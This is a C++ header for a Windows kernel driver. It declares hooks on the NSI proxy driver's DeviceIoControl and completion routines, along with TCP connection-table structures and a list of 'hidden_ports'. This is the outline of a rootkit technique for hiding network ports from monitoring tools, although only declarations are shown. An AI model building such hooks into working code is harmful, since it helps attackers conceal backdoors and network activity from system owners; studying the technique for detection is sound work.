#pragma once
#include <Ntifs.h>
#include "Vector.h"

namespace NetHook {
	USHORT htons(USHORT a);

	NTSTATUS  initNsiHook();

	NTSTATUS hookedCompletion(
		IN PDEVICE_OBJECT  DeviceObject,
		IN PIRP  Irp,
		IN PVOID  Context
	);

	NTSTATUS hookedDeviceIoControl(
		IN PDEVICE_OBJECT  DeviceObject,
		IN PIRP  Irp
	);

	void unhookNsiProxy();

	extern "C" NTSYSAPI NTSTATUS NTAPI ObReferenceObjectByName(
		PUNICODE_STRING ObjectName,
		ULONG Attributes,
		PACCESS_STATE AccessState,
		ACCESS_MASK DesiredAccess,
		POBJECT_TYPE ObjectType,
		KPROCESSOR_MODE AccessMode,
		PVOID ParseContext OPTIONAL,
		PVOID * Object
	);

	extern "C" POBJECT_TYPE * IoDriverObjectType;

	constexpr ULONG IOCTL_NSI_GETALLPARAM = 0x12001B;


	extern PDRIVER_OBJECT pNsi_driver_object;
	extern PDRIVER_DISPATCH original_nsi_device_io;
	extern vector<USHORT>* hidden_ports;

	typedef unsigned long DWORD;

	typedef struct _HP_CONTEXT
	{
		PIO_COMPLETION_ROUTINE oldIocomplete;
		PVOID oldCtx;
		BOOLEAN bShouldInvolve;
		PKPROCESS pcb;
	}HP_CONTEXT, * PHP_CONTEXT;

	typedef struct _INTERNAL_TCP_TABLE_SUBENTRY
	{
		char bytesfill0[2];
		USHORT Port;
		DWORD dwIP;
		char bytesfill[20];

	}INTERNAL_TCP_TABLE_SUBENTRY, * PINTERNAL_TCP_TABLE_SUBENTRY;

	typedef struct _INTERNAL_TCP_TABLE_ENTRY
	{
		INTERNAL_TCP_TABLE_SUBENTRY localEntry;
		INTERNAL_TCP_TABLE_SUBENTRY remoteEntry;

	}INTERNAL_TCP_TABLE_ENTRY, * PINTERNAL_TCP_TABLE_ENTRY;

	typedef struct _NSI_STATUS_ENTRY
	{
		char bytesfill[12];

	}NSI_STATUS_ENTRY, * PNSI_STATUS_ENTRY;

	typedef struct _NSI_PARAM
	{

		DWORD UnknownParam1;
		DWORD UnknownParam2;
		DWORD UnknownParam3;
		DWORD UnknownParam4;
		DWORD UnknownParam5;
		DWORD UnknownParam6;
		PVOID lpMem;
		DWORD UnknownParam8;
		DWORD UnknownParam9;
		DWORD UnknownParam10;
		PNSI_STATUS_ENTRY lpStatus;
		DWORD UnknownParam12;
		DWORD UnknownParam13;
		DWORD UnknownParam14;
		DWORD TcpConnCount;


	}NSI_PARAM, * PNSI_PARAM;

}

